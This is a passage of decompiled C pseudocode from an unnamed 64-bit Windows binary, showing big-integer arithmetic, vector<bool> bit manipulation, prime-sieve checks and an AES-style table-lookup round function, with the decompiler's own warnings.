        if ( v31 )
        {
          memset(v31, 0, 8 * v20);
          sub_13F12E4D0(v21);
        }
        v22 = v43;
        if ( v42 < v43 )
          v22 = v42;
        v23 = (__int64)v44;
        if ( v44 )
        {
          memset(v44, 0, 8 * v22);
          sub_13F12E4D0(v23);
        }
        if ( !sub_13F137E00(a2, (__int64)v36) )
          break;
        if ( ++v17 >= a3 )
          goto LABEL_35;
      }
      v26 = v38;
      if ( v37 < v38 )
        v26 = v37;
      v27 = (__int64)v39;
      if ( v39 )
      {
        memset(v39, 0, 8 * v26);
        sub_13F12E4D0(v27);
      }
      return 0;
    }
    else
    {
LABEL_35:
      v24 = v38;
      if ( v37 < v38 )
        v24 = v37;
      v25 = (__int64)v39;
      if ( v39 )
      {
        memset(v39, 0, 8 * v24);
        sub_13F12E4D0(v25);
      }
      return 1;
    }
  }
}

//----- (000000013F139590) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F139590()
{
  if ( *(int *)(*((_QWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + (unsigned int)TlsIndex) + 4i64) < -2147483646 )
    sub_13F14045C(&dword_13F1C5640);
  return 3991696i64;
}
// 13F13972F: write access to const memory at 13F1C5648 has been detected
// 13F1C5640: using guessed type int dword_13F1C5640;
// 13F1C5CF0: using guessed type int TlsIndex;

//----- (000000013F1397A0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F1397A0()
{
  if ( *(int *)(*((_QWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + (unsigned int)TlsIndex) + 4i64) < -2147483645 )
    sub_13F14045C(&dword_13F1C56A0);
  return 4099072i64;
}
// 13F1398B7: write access to const memory at 13F1C56A8 has been detected
// 13F1C56A0: using guessed type int dword_13F1C56A0;
// 13F1C5CF0: using guessed type int TlsIndex;

//----- (000000013F139920) ----------------------------------------------------
int __fastcall sub_13F139920(_QWORD *a1, unsigned __int16 a2, __int64 a3, __int64 a4, unsigned __int16 a5)
{
  void **v5; // rax
  char v8; // bl
  unsigned __int64 v10; // r14
  __int64 v11; // rsi
  unsigned int v12; // edi
  bool v13; // r12
  unsigned __int64 v14; // rcx
  __int64 v15; // rdx
  unsigned __int64 v16; // rcx
  __int64 v17; // rdx
  unsigned __int64 v18; // rcx
  __int64 v19; // rdx
  unsigned __int64 v20; // rcx
  __int64 v21; // rdx
  unsigned __int64 v22; // rdi
  _DWORD *v23; // rdx
  unsigned __int64 v25; // [rsp+30h] [rbp-A9h]
  char v26[16]; // [rsp+40h] [rbp-99h] BYREF
  unsigned __int64 v27; // [rsp+50h] [rbp-89h]
  unsigned __int64 v28; // [rsp+58h] [rbp-81h]
  void *v29; // [rsp+60h] [rbp-79h]
  char v30[16]; // [rsp+70h] [rbp-69h] BYREF
  unsigned __int64 v31; // [rsp+80h] [rbp-59h]
  unsigned __int64 v32; // [rsp+88h] [rbp-51h]
  void *v33; // [rsp+90h] [rbp-49h]
  char v34[16]; // [rsp+A0h] [rbp-39h] BYREF
  unsigned __int64 v35; // [rsp+B0h] [rbp-29h]
  unsigned __int64 v36; // [rsp+B8h] [rbp-21h]
  void *v37; // [rsp+C0h] [rbp-19h]
  char v38[16]; // [rsp+D0h] [rbp-9h] BYREF
  unsigned __int64 v39; // [rsp+E0h] [rbp+7h]
  unsigned __int64 v40; // [rsp+E8h] [rbp+Fh]
  void *v41; // [rsp+F0h] [rbp+17h]
  void *retaddr; // [rsp+130h] [rbp+57h] BYREF
  unsigned int v44; // [rsp+158h] [rbp+7Fh]

  v5 = &retaddr;
  v8 = 0;
  if ( a5 )
  {
    v10 = a1[3];
    v11 = a2;
    v44 = a2;
    v12 = (a2 - (unsigned int)sub_13F11FDF0(a3, a2)) * a5 % a2;
    v25 = v12;
    v13 = 0;
    if ( (unsigned int)sub_13F123630(a3) <= 1 )
    {
      sub_13F112AD0((__int64)v38, v44);
      sub_13F112AD0((__int64)v34, v12);
      sub_13F1234E0(a4, (__int64)v30, (__int64)v34);
      sub_13F120ED0(a3, (__int64)v26, (__int64)v30);
      v8 = 63;
      if ( !(unsigned int)sub_13F11C520((__int64)v26, (__int64)v38) )
        v13 = 1;
    }
    if ( (v8 & 8) != 0 )
    {
      v8 &= ~8u;
      v14 = v28;
      if ( v27 < v28 )
        v14 = v27;
      v15 = (__int64)v29;
      if ( v29 )
      {
        memset(v29, 0, 8 * v14);
        sub_13F12E4D0(v15);
      }
    }
    if ( (v8 & 4) != 0 )
    {
      v8 &= ~4u;
      v16 = v32;
      if ( v31 < v32 )
        v16 = v31;
      v17 = (__int64)v33;
      if ( v33 )
      {
        memset(v33, 0, 8 * v16);
        sub_13F12E4D0(v17);
      }
    }
    if ( (v8 & 2) != 0 )
    {
      v8 &= ~2u;
      v18 = v36;
      if ( v35 < v36 )
        v18 = v35;
      v19 = (__int64)v37;
      if ( v37 )
      {
        memset(v37, 0, 8 * v18);
        sub_13F12E4D0(v19);
      }
    }
    if ( (v8 & 1) != 0 )
    {
      v20 = v40;
      if ( v39 < v40 )
        v20 = v39;
      v21 = (__int64)v41;
      if ( v41 )
      {
        memset(v41, 0, 8 * v20);
        sub_13F12E4D0(v21);
      }
    }
    LODWORD(v5) = v12;
    v22 = v11 + v12;
    if ( !v13 )
      v22 = v25;
    for ( ; v22 < v10; v22 += v11 )
    {
      v23 = (_DWORD *)(*a1 + 4 * (v22 >> 5));
      LODWORD(v5) = *v23 | (1 << (v22 & 0x1F));
      *v23 = (_DWORD)v5;
    }
  }
  return (int)v5;
}

//----- (000000013F139B50) ----------------------------------------------------
bool __fastcall sub_13F139B50(__int64 a1, unsigned int a2)
{
  unsigned __int64 v3; // rdi
  unsigned __int16 **v4; // rax
  __int64 v5; // rbx
  __int64 v6; // rsi
  unsigned int v7; // eax

  v3 = a2;
  v4 = (unsigned __int16 **)sub_13F139590();
  v5 = 0i64;
  v6 = (__int64)*v4;
  v7 = **v4;
  if ( v7 >= (unsigned int)v3 )
    return (_DWORD)v3 == *(unsigned __int16 *)(v6 + 2 * v5) && sub_13F11FDF0(a1, v3) == 0;
  while ( sub_13F11FDF0(a1, (unsigned __int16)v7) )
  {
    v5 = (unsigned int)(v5 + 1);
    LOWORD(v7) = *(_WORD *)(v6 + 2 * v5);
    if ( (unsigned __int16)v7 >= (unsigned int)v3 )
      return (_DWORD)v3 == *(unsigned __int16 *)(v6 + 2 * v5) && sub_13F11FDF0(a1, v3) == 0;
  }
  return 1;
}

//----- (000000013F139BE0) ----------------------------------------------------
bool __fastcall sub_13F139BE0(__int64 a1, __int64 a2, int a3)
{
  bool result; // al

  result = sub_13F137550(a2) && sub_13F1392E0(a1, a2, 1u);
  if ( a3 )
    return result && sub_13F1392E0(a1, a2, 0xAu);
  return result;
}

//----- (000000013F139C70) ----------------------------------------------------
__int64 __fastcall sub_13F139C70(__int64 *a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v6; // rcx
  unsigned __int64 v9; // rdx
  __int64 result; // rax

  v6 = *a1;
  if ( v6 )
  {
    v9 = 2 * ((a1[2] - v6) >> 1);
    if ( v9 >= 0x1000 )
    {
      v9 += 39i64;
      if ( (unsigned __int64)(v6 - *(_QWORD *)(v6 - 8) - 8) > 0x1F )
        sub_13F1682C0();
      v6 = *(_QWORD *)(v6 - 8);
    }
    sub_13F14088C(v6, v9);
  }
  *a1 = a2;
  a1[1] = a2 + 2 * a3;
  result = a2 + 2 * a4;
  a1[2] = result;
  return result;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F139D00) ----------------------------------------------------
__int64 __fastcall sub_13F139D00(_QWORD *a1, _QWORD *a2, unsigned __int64 a3)
{
  __int64 v5; // rdi
  __int64 v6; // rcx
  __int64 v7; // rcx
  __int64 v9; // rdx
  unsigned __int64 v10; // rdx
  __int64 v11; // r10
  _DWORD *v12; // r10
  __int64 v13; // rdx
  int *v14; // r8
  __int64 v15; // rcx
  _DWORD *v16; // r9
  int v17; // eax
  int *v18; // [rsp+20h] [rbp-28h]
  _QWORD *v19; // [rsp+30h] [rbp-18h] BYREF
  int *v20; // [rsp+38h] [rbp-10h]
  int v21; // [rsp+50h] [rbp+8h] BYREF

  v5 = a2[1] + 32 * ((__int64)(*a2 - *a1) >> 2);
  if ( a3 )
  {
    v6 = a1[3];
    if ( 0x7FFFFFFFFFFFFFFFi64 - v6 < a3 )
      sub_13F139F70();
    v19 = a1;
    v21 = 0;
    v20 = &v21;
    sub_13F1363C0((__int64)a1, (v6 + a3 + 31) >> 5, (__int64)&v19);
    v7 = a1[3];
    if ( v7 )
    {
      v9 = *a1;
      if ( v7 >= 0 )
        v19 = (_QWORD *)(v9 + 4 * ((unsigned __int64)v7 >> 5));
      else
        v19 = (_QWORD *)(v9 - (4 * ((unsigned __int64)~v7 >> 5) + 4));
      v10 = v7 + a3;
      a1[3] = v7 + a3;
      v11 = *a1;
      v20 = (int *)(v7 & 0x1F);
      if ( (__int64)(v7 + a3) >= 0 )
        v18 = (int *)(v11 + 4 * (v10 >> 5));
      else
        v18 = (int *)(v11 - (4 * (~v10 >> 5) + 4));
      if ( v5 >= 0 )
        v12 = (_DWORD *)(v11 + 4 * ((unsigned __int64)v5 >> 5));
      else
        v12 = (_DWORD *)(v11 - (4 * ((unsigned __int64)~v5 >> 5) + 4));
      v13 = v10 & 0x1F;
      v14 = v18;
      v15 = (__int64)v20;
      v16 = v19;
      while ( v12 != v16 || (v5 & 0x1F) != v15 )
      {
        if ( v15 )
        {
          --v15;
        }
        else
        {
          v15 = 31i64;
          --v16;
        }
        if ( v13 )
        {
          --v13;
        }
        else
        {
          v13 = 31i64;
          --v14;
        }
        v17 = *v14;
        if ( ((1 << v15) & *v16) != 0 )
          *v14 = v17 | (1 << v13);
        else
          *v14 = v17 & ~(1 << v13);
      }
    }
    else
    {
      a1[3] = a3;
    }
  }
  return v5;
}
// 13F139DAE: conditional instruction was optimized away because rcx.8<0
// 13F139E41: conditional instruction was optimized away because rdi.8<0

//----- (000000013F139F00) ----------------------------------------------------
__int64 __fastcall sub_13F139F00(__int64 a1, unsigned __int64 a2)
{
  __int64 v4; // rdi
  __m128i *v5; // rsi

  v4 = (__int64)(*(_QWORD *)(a1 + 8) - *(_QWORD *)a1) >> 1;
  v5 = (__m128i *)sub_13F139F90(a1, a2);
  sub_13F15EB00(v5, *(const __m128i **)a1, *(_QWORD *)(a1 + 8) - *(_QWORD *)a1);
  return sub_13F139C70((__int64 *)a1, (__int64)v5, v4, a2);
}
// 13F139F38: ignored the value written to the shadow area of the succeeding call
// 13F139F05: ignored the value written to the shadow area of the succeeding call
// 13F139F00: ignored the value written to the shadow area of the succeeding call

//----- (000000013F139F70) ----------------------------------------------------
void __noreturn sub_13F139F70()
{
  sub_13F10998C((__int64)"vector<bool> too long");
}

//----- (000000013F139F90) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F139F90(__int64 a1, unsigned __int64 a2)
{
  unsigned __int64 result; // rax
  __int64 v3; // rcx
  __int64 v4; // rax
  __int64 v5; // rcx

  result = 2 * a2;
  if ( a2 > 0x7FFFFFFFFFFFFFFFi64 )
  {
    result = -1i64;
LABEL_4:
    v3 = result + 39;
    if ( result + 39 <= result )
      v3 = -1i64;
    v4 = sub_13F14059C(v3);
    v5 = v4;
    if ( !v4 )
      sub_13F1682C0();
    result = (v4 + 39) & 0xFFFFFFFFFFFFFFE0ui64;
    *(_QWORD *)(result - 8) = v5;
    return result;
  }
  if ( result >= 0x1000 )
    goto LABEL_4;
  if ( result )
    return sub_13F14059C(2 * a2);
  return result;
}

//----- (000000013F13A000) ----------------------------------------------------
__int64 __fastcall sub_13F13A000(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v4; // rdx

  v4 = 2 * a3;
  if ( (unsigned __int64)(2 * a3) >= 0x1000 )
  {
    v4 += 39i64;
    if ( (unsigned __int64)(a2 - *(_QWORD *)(a2 - 8) - 8) > 0x1F )
      sub_13F1682C0();
    a2 = *(_QWORD *)(a2 - 8);
  }
  return sub_13F14088C(a2, v4);
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F13A040) ----------------------------------------------------
_OWORD *__fastcall sub_13F13A040(unsigned __int64 *a1, _OWORD *a2, __int128 *a3, __int128 *a4)
{
  __int128 v4; // xmm0
  unsigned __int64 v5; // r11
  __int64 v6; // r8
  __int64 v7; // r10
  unsigned __int64 v8; // rbx
  __int64 v11; // r8
  __int64 v12; // rcx
  unsigned __int64 v13; // rdx
  __int64 v14; // rcx
  __int64 v15; // rsi
  _DWORD *v16; // r11
  int v17; // er10
  unsigned __int64 v18; // r8
  int *v19; // rdx
  unsigned __int64 v20; // rcx
  _DWORD *v21; // r9
  int v22; // eax
  int v23; // eax
  unsigned __int64 v24; // rcx
  unsigned __int64 v25; // rdx
  unsigned __int64 v26; // r9
  unsigned __int64 v27; // rax
  int v28; // edx
  __int128 v30; // [rsp+20h] [rbp-30h]
  __int128 v31; // [rsp+30h] [rbp-20h]
  __int128 v32; // [rsp+40h] [rbp-10h] BYREF

  v4 = *a3;
  v5 = *a1;
  v6 = 0i64;
  v7 = a1[3];
  v8 = *a1;
  v30 = *a1;
  if ( v7 )
  {
    v11 = *((_QWORD *)&v4 + 1) + 32 * ((__int64)(v4 - v5) >> 2);
    if ( v11 >= 0 )
      v8 = v5 + 4 * ((unsigned __int64)v11 >> 5);
    else
      v8 -= 4 * ((unsigned __int64)~v11 >> 5) + 4;
    v6 = v11 & 0x1F;
    *(_QWORD *)&v30 = v8;
    *((_QWORD *)&v30 + 1) = (unsigned int)v6;
  }
  v12 = 0i64;
  v13 = v5;
  v31 = v5;
  v32 = *a4;
  if ( v7 )
  {
    v14 = *((_QWORD *)&v32 + 1) + 32 * ((__int64)(v32 - v5) >> 2);
    if ( v14 >= 0 )
      v13 = v5 + 4 * ((unsigned __int64)v14 >> 5);
    else
      v13 = v5 - (4 * ((unsigned __int64)~v14 >> 5) + 4);
    v12 = v14 & 0x1F;
    *(_QWORD *)&v31 = v13;
    *((_QWORD *)&v31 + 1) = (unsigned int)v12;
  }
  v15 = v6 + 32 * ((__int64)(v8 - v5) >> 2);
  if ( v8 != v13 || v6 != v12 )
  {
    if ( v7 >= 0 )
      v16 = (_DWORD *)(v5 + 4 * ((unsigned __int64)v7 >> 5));
    else
      v16 = (_DWORD *)(v5 - (4 * ((unsigned __int64)~v7 >> 5) + 4));
    v17 = v7 & 0x1F;
    v18 = *((_QWORD *)&v30 + 1);
    v19 = (int *)v30;
    v32 = v31;
    v20 = *((_QWORD *)&v31 + 1);
    v21 = (_DWORD *)v31;
    while ( v21 != v16 || v20 != v17 )
    {
      v22 = *v19;
      if ( ((1 << v20) & *v21) != 0 )
        v23 = v22 | (1 << v18);
      else
        v23 = v22 & ~(1 << v18);
      *v19 = v23;
      if ( v18 >= 0x1F )
      {
        v18 = 0i64;
        ++v19;
      }
      else
      {
        ++v18;
      }
      if ( v20 >= 0x1F )
      {
        v20 = 0i64;
        ++v21;
      }
      else
      {
        ++v20;
      }
    }
    v24 = *a1;
    v25 = v18 + 32 * ((__int64)((__int64)v19 - *a1) >> 2);
    if ( v25 > 0x7FFFFFFFFFFFFFFFi64 )
      sub_13F139F70();
    v26 = (v25 + 31) >> 5;
    if ( v26 < (__int64)(a1[1] - v24) >> 2 )
    {
      v27 = v24 + 4 * v26;
      if ( v27 != a1[1] )
        a1[1] = v27;
    }
    a1[3] = v25;
    v28 = v25 & 0x1F;
    if ( v28 )
      *(_DWORD *)(v24 + 4 * v26 - 4) &= (1 << v28) - 1;
  }
  v32 = *a1;
  sub_13F1368A0(&v32, a2, v15);
  return a2;
}
// 13F13A09F: conditional instruction was optimized away because r8.8<0
// 13F13A104: conditional instruction was optimized away because rcx.8<0
// 13F13A15D: conditional instruction was optimized away because r10.8<0

//----- (000000013F13A2A0) ----------------------------------------------------
void __fastcall sub_13F13A2A0(unsigned __int64 *a1, unsigned __int64 a2, char a3)
{
  __int64 v3; // r9
  unsigned __int64 v7; // rcx
  __int64 v8; // rbx
  __int64 v9; // rax
  unsigned __int64 v10; // r8
  unsigned __int64 v11; // r8
  unsigned __int64 v12; // rdx
  char v13; // r9
  int *v14; // r8
  int v15; // er9
  unsigned __int64 v16; // rcx
  int *v17; // rdx
  int v18; // eax
  int v19; // eax
  unsigned __int64 v20; // rdx
  __int128 v21; // [rsp+20h] [rbp-30h] BYREF
  __int128 v22; // [rsp+30h] [rbp-20h] BYREF
  __int128 v23; // [rsp+40h] [rbp-10h] BYREF

  v3 = a1[3];
  if ( v3 >= a2 )
  {
    if ( v3 > a2 )
    {
      v20 = *a1;
      if ( v3 >= 0 )
        *(_QWORD *)&v21 = v20 + 4 * ((unsigned __int64)v3 >> 5);
      else
        *(_QWORD *)&v21 = v20 - (4 * ((unsigned __int64)~v3 >> 5) + 4);
      *((_QWORD *)&v21 + 1) = v3 & 0x1F;
      if ( (a2 & 0x8000000000000000ui64) == 0i64 )
        *(_QWORD *)&v22 = v20 + 4 * (a2 >> 5);
      else
        *(_QWORD *)&v22 = v20 - (4 * (~a2 >> 5) + 4);
      *((_QWORD *)&v22 + 1) = a2 & 0x1F;
      sub_13F13A040(a1, &v23, &v22, &v21);
    }
  }
  else
  {
    v7 = *a1;
    if ( v3 >= 0 )
      *(_QWORD *)&v21 = v7 + 4 * ((unsigned __int64)v3 >> 5);
    else
      *(_QWORD *)&v21 = v7 - (4 * ((unsigned __int64)~v3 >> 5) + 4);
    v8 = a2 - v3;
    *((_QWORD *)&v21 + 1) = v3 & 0x1F;
    v22 = v21;
    v9 = sub_13F139D00(a1, &v22, a2 - v3);
    v10 = *a1;
    v22 = *a1;
    v21 = v22;
    if ( v9 >= 0 )
      v11 = v10 + 4 * ((unsigned __int64)v9 >> 5);
    else
      v11 = v10 - (4 * ((unsigned __int64)~v9 >> 5) + 4);
    v12 = v9 & 0x1F;
    *(_QWORD *)&v21 = v11;
    *((_QWORD *)&v21 + 1) = v12;
    if ( v8 >= 0 || v12 >= -v8 )
    {
      v13 = v12 + v8;
      v14 = (int *)(v11 + 4 * ((v12 + v8) >> 5));
    }
    else
    {
      v13 = v12 + v8;
      v14 = (int *)(v11 - (4 * (~(v12 + v8) >> 5) + 4));
    }
    v15 = v13 & 0x1F;
    v22 = v21;
    v16 = *((_QWORD *)&v21 + 1);
    v17 = (int *)v21;
    while ( v17 != v14 || v16 != v15 )
    {
      v18 = *v17;
      if ( a3 )
        v19 = v18 | (1 << v16);
      else
        v19 = v18 & ~(1 << v16);
      *v17 = v19;
      if ( v16 >= 0x1F )
      {
        v16 = 0i64;
        ++v17;
      }
      else
      {
        ++v16;
      }
    }
  }
}
// 13F13A2DC: conditional instruction was optimized away because r9.8<0
// 13F13A353: conditional instruction was optimized away because rax.8<0
// 13F13A416: conditional instruction was optimized away because r9.8<0
// 13F13A458: conditional instruction was optimized away because rbx.8<0

//----- (000000013F13A4D0) ----------------------------------------------------
_BOOL8 __fastcall sub_13F13A4D0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rdx
  __int64 v5; // r8
  __int64 v6; // r9
  bool v7; // cf
  __int64 v8; // rcx
  __int64 v9; // rax
  bool v10; // cf
  __int64 v11; // rax
  __int64 v12; // rax
  _BOOL8 v13; // rtt
  __int64 v14; // rax
  __int64 v15; // rax
  _BOOL8 v16; // rtt

  v4 = a2 + 8 * a1;
  v5 = a3 + 8 * a1;
  v6 = a4 + 8 * a1;
  v8 = -a1;
  v7 = v8 != 0;
  if ( v8 )
  {
    v9 = *(_QWORD *)(v5 + 8 * v8);
    v10 = __CFADD__(*(_QWORD *)(v6 + 8 * v8), v9);
    for ( *(_QWORD *)(v4 + 8 * v8) = *(_QWORD *)(v6 + 8 * v8) + v9;
          ;
          *(_QWORD *)(v4 + 8 * v8) = *(_QWORD *)(v6 + 8 * v8) + v15 )
    {
      v11 = *(_QWORD *)(v5 + 8 * v8 + 8);
      v13 = v10;
      v7 = __CFADD__(v10, v11);
      v12 = v13 + v11;
      v7 |= __CFADD__(*(_QWORD *)(v6 + 8 * v8 + 8), v12);
      *(_QWORD *)(v4 + 8 * v8 + 8) = *(_QWORD *)(v6 + 8 * v8 + 8) + v12;
      v8 += 2i64;
      if ( !v8 )
        break;
      v14 = *(_QWORD *)(v5 + 8 * v8);
      v16 = v7;
      v7 = __CFADD__(v7, v14);
      v15 = v16 + v14;
      v10 = v7 | __CFADD__(*(_QWORD *)(v6 + 8 * v8), v15);
    }
  }
  return v7;
}

//----- (000000013F13A520) ----------------------------------------------------
_BOOL8 __fastcall sub_13F13A520(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rdx
  __int64 v5; // r8
  __int64 v6; // r9
  bool v7; // cf
  __int64 v8; // rcx
  unsigned __int64 v9; // rax
  bool v10; // cf
  unsigned __int64 v11; // rax
  unsigned __int64 v12; // rtt
  unsigned __int64 v13; // rax
  unsigned __int64 v14; // rtt

  v4 = a2 + 8 * a1;
  v5 = a3 + 8 * a1;
  v6 = a4 + 8 * a1;
  v8 = -a1;
  v7 = v8 != 0;
  if ( v8 )
  {
    v9 = *(_QWORD *)(v5 + 8 * v8);
    v10 = v9 < *(_QWORD *)(v6 + 8 * v8);
    for ( *(_QWORD *)(v4 + 8 * v8) = v9 - *(_QWORD *)(v6 + 8 * v8); ; *(_QWORD *)(v4 + 8 * v8) = v13 - v14 )
    {
      v11 = *(_QWORD *)(v5 + 8 * v8 + 8);
      v12 = v10 + *(_QWORD *)(v6 + 8 * v8 + 8);
      v7 = v11 < v12;
      *(_QWORD *)(v4 + 8 * v8 + 8) = v11 - v12;
      v8 += 2i64;
      if ( !v8 )
        break;
      v13 = *(_QWORD *)(v5 + 8 * v8);
      v14 = v7 + *(_QWORD *)(v6 + 8 * v8);
      v10 = v13 < v14;
    }
  }
  return v7;
}

//----- (000000013F13A570) ----------------------------------------------------
__m128i *__fastcall sub_13F13A570(__m128i *a1, const __m128i *a2)
{
  __int16 v2; // r10
  __m128i *v3; // r8
  __int64 v4; // rsi
  __int8 *v5; // rax
  __m128i si128; // xmm4
  __m128i v7; // xmm1
  __int32 v8; // er12
  __int32 v9; // ebx
  __int32 v10; // ecx
  __int32 v11; // edx
  __int64 i; // rax
  __m128i v13; // xmm2
  int v14; // eax
  unsigned int v15; // eax
  __m128i v16; // xmm2
  int v17; // edi
  __m128i v18; // xmm2
  int v19; // er12
  int v20; // edx
  int v21; // ecx
  int v22; // ebx
  unsigned int v23; // eax
  int v24; // edi
  __m128i v25; // xmm2
  int v26; // ebx
  int v27; // er12
  int v28; // edx
  int v29; // ecx
  unsigned int v30; // eax
  int v31; // edi
  int v32; // ecx
  int v33; // ebx
  int v34; // er12
  unsigned int v35; // edx
  unsigned int v36; // ecx
  unsigned int v37; // ebx
  int v38; // edi
  int v39; // er9
  int v40; // eax
  int v41; // eax
  int v42; // ebx
  int v43; // ebx
  int v44; // edi
  int v45; // er9
  __int64 v46; // rcx
  int v47; // edx
  __m128i v48; // xmm2
  unsigned int v49; // eax
  __m128i v50; // xmm2
  int v51; // edi
  __m128i v52; // xmm2
  int v53; // er12
  int v54; // edx
  int v55; // ebx
  int v56; // er12
  int v57; // edx
  int v58; // ecx
  unsigned int v59; // eax
  int v60; // edi
  int v61; // ecx
  int v62; // ebx
  unsigned int v63; // edx
  unsigned int v64; // ecx
  unsigned int v65; // ebx
  unsigned int v66; // eax
  __int64 v67; // r8
  unsigned int v68; // edx
  unsigned int v69; // ebx
  int v70; // ecx
  unsigned int v71; // ecx
  unsigned int v72; // eax
  unsigned int v73; // edx
  int v74; // er9
  int v75; // edi
  unsigned int v76; // eax
  int v77; // edi
  int v78; // er9
  unsigned int v79; // ebx
  int v80; // er9
  int v81; // eax
  int v82; // ebx
  unsigned int v83; // ecx
  int v84; // eax
  int v85; // ebx
  unsigned int v86; // edx
  int v87; // ebx
  int v88; // er9
  int v89; // edi
  unsigned int v90; // eax
  int v91; // edi
  int v92; // er9
  unsigned int v93; // ebx
  int v94; // er9
  int v95; // eax
  int v96; // ebx
  unsigned int v97; // ecx
  int v98; // eax
  int v99; // ebx
  unsigned int v100; // edx
  int v101; // ebx
  unsigned int v102; // edx
  unsigned int v103; // eax
  unsigned int v104; // ebx
  unsigned int v105; // ecx
  __m128i *v106; // rbx
  __int64 v107; // rcx
  bool v108; // cc
  __int64 v109; // rcx
  __m128i v110; // xmm2
  __m128i *result; // rax

  v3 = a1;
  v4 = a1[19].m128i_i64[0];
  a1[12] = _mm_load_si128((const __m128i *)((char *)a2 + (v4 & 0x10) + 16));
  v5 = &a2[2].m128i_i8[(v4 & 0x10) - v4];
  do
  {
    *(__m128i *)((char *)a1 + v4) = _mm_load_si128((const __m128i *)&v5[v4]);
    v4 += 16i64;
  }
  while ( v4 < 192 );
  si128 = _mm_load_si128((const __m128i *)&v5[v4]);
  v7 = _mm_load_si128(a2);
  v8 = a2[1].m128i_i32[0];
  v9 = a2[1].m128i_i32[1];
  v10 = a2[1].m128i_i32[2];
  v11 = a2[1].m128i_i32[3];
  for ( i = 0i64; i < 2048; i += 256i64 )
    ;
  _mm_lfence();
  if ( (v3[18].m128i_i32[2] & 1) == 0 )
    goto LABEL_7;
  v13 = _mm_xor_si128(_mm_loadu_si128((const __m128i *)v3[14].m128i_i64[0]), v7);
  v7 = _mm_srli_si128(v7, 14);
  v14 = _mm_cvtsi128_si32(v7);
  LOBYTE(v14) = *(_BYTE *)(v3[14].m128i_i64[0] + 15);
  v2 = v14;
  v15 = _mm_cvtsi128_si32(v13);
  v16 = _mm_srli_si128(v13, 4);
  v17 = _mm_cvtsi128_si32(v16);
  v18 = _mm_srli_si128(v16, 4);
  v19 = HIDWORD(qword_13F1C45D0[(unsigned __int8)v15]) ^ v8;
  v20 = *(_DWORD *)((char *)&qword_13F1C45D0[BYTE1(v15)] + 1) ^ v11;
  v15 >>= 16;
  v21 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v15] + 2) ^ v10;
  v22 = *(_DWORD *)((char *)&qword_13F1C45D0[BYTE1(v15)] + 3) ^ v9;
  v23 = v17;
  v24 = _mm_cvtsi128_si32(v18);
  v25 = _mm_srli_si128(v18, 4);
  v26 = HIDWORD(qword_13F1C45D0[(unsigned __int8)v23]) ^ v22;
  v27 = *(_DWORD *)((char *)&qword_13F1C45D0[BYTE1(v23)] + 1) ^ v19;
  v23 >>= 16;
  v28 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v23] + 2) ^ v20;
  v29 = *(_DWORD *)((char *)&qword_13F1C45D0[BYTE1(v23)] + 3) ^ v21;
  v30 = v24;
  v31 = _mm_cvtsi128_si32(v25);
  v32 = HIDWORD(qword_13F1C45D0[(unsigned __int8)v30]) ^ v29;
  v33 = *(_DWORD *)((char *)&qword_13F1C45D0[BYTE1(v30)] + 1) ^ v26;
  v30 >>= 16;
  v34 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v30] + 2) ^ v27;
  v35 = HIDWORD(qword_13F1C45D0[(unsigned __int8)v31]) ^ *(_DWORD *)((char *)&qword_13F1C45D0[BYTE1(v30)] + 3) ^ v28;
  v36 = *(_DWORD *)((char *)&qword_13F1C45D0[BYTE1(v31)] + 1) ^ v32;
  v37 = *(_DWORD *)((char *)&qword_13F1C45D0[BYTE2(v31)] + 2) ^ v33;
  v38 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v37] + 3) ^ v3[12].m128i_i32[2];
  v39 = *(_DWORD *)((char *)&qword_13F1C45D0[BYTE1(v37)] + 2) ^ *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v36]
                                                                          + 3) ^ v3[12].m128i_i32[3];
  v37 >>= 16;
  v40 = *(_DWORD *)((char *)&qword_13F1C45D0[BYTE1(v36)] + 2) ^ *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v37]
                                                                          + 1) ^ v3[12].m128i_i32[0];
  v36 >>= 16;
  v41 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v35] + 3) ^ v40;
  v42 = *(_DWORD *)((char *)&qword_13F1C45D0[BYTE1(v35)] + 2) ^ v3[12].m128i_i32[1] ^ HIDWORD(qword_13F1C45D0[BYTE1(v37)]);
  v35 >>= 16;
  v43 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v36] + 1) ^ v42;
  v44 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v35] + 1) ^ HIDWORD(qword_13F1C45D0[BYTE1(v36)]) ^ v38;
  v45 = HIDWORD(qword_13F1C45D0[BYTE1(v35)]) ^ v39;
  v46 = (unsigned int)_mm_cvtsi128_si32(_mm_srli_si128(v25, 3));
  v47 = v34;
  v3->m128i_i32[3] = v45;
  v3->m128i_i32[0] = v41;
  v3->m128i_i32[1] = v43;
  v3->m128i_i32[2] = v44;
LABEL_9:
  ++v2;
  v68 = *(_DWORD *)((char *)&qword_13F1C45D0[v46] + 3) ^ v47;
  v69 = *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v68] + 3) ^ v43;
  v70 = *(_DWORD *)((char *)&qword_13F1C45D0[BYTE1(v68)] + 2);
  v68 >>= 16;
  v71 = v3->m128i_i32[2] ^ v70;
  v72 = HIDWORD(qword_13F1C45D0[BYTE1(v68)]) ^ v41;
  v73 = v3->m128i_i32[3] ^ *(_DWORD *)((char *)&qword_13F1C45D0[(unsigned __int8)v68] + 1);
  v67 = (__int64)v3[3].m128i_i64 + v3[19].m128i_i64[0];
  while ( 1 )
  {
